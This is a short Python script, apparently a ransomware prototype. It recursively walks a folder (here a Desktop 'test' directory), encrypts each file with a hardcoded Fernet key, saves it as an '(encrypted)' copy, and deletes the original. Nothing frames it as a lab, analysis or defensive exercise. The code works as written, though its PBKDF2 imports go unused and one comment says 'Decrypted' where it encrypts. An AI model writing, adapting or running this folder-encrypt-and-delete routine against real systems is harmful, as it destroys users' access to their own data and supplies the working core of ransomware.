from os import walk, remove, urandom
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# ChuckSize to read
# CHUNK_SIZE = 64 * 1024
ENCRYPTED = "(encrypted)"

# Encryption Passkey
KEY = b'CUW-34FKrHuiwgvrh-d7iBCdNxUcexhcCXheTA5Z9yw='

# Create Fernet Object from Cryptography library
FERNET_OBJECT = Fernet(KEY)

def deleteFile(filePath):
    try:
        remove(filePath)
    except:
        print("Remove Failed")


def encryptFile(inputFilePath, inputFileName):
    print("Encrypting File :: " + inputFilePath + "\\" + inputFileName)
    # Input File Handler to read file in binary format
    infile = open(inputFilePath + "\\" + inputFileName, "rb")
    # Output File Handler to write file in binary format
    outfile = open(inputFilePath + "\\" + ENCRYPTED + inputFileName, 'wb')

    # Read and Write the file
    try:
        fileReadStatus = True
        while fileReadStatus:
            bytes_read = infile.read()
            if len(bytes_read) <= 0:
                fileReadStatus = False
            else:
                # Write the Decrypted File content
                outfile.write(FERNET_OBJECT.encrypt(bytes_read))
    finally:
        infile.close()
        outfile.close()

def encryptfolder(folderPath):
    for root, dirs,files in walk(folderPath):
        for file in files:
            encryptFile(root, file)
            deleteFile(root + "\\" + file)

folderPath = "C:\\Users\\135670\\Desktop\\test"
encryptfolder(folderPath)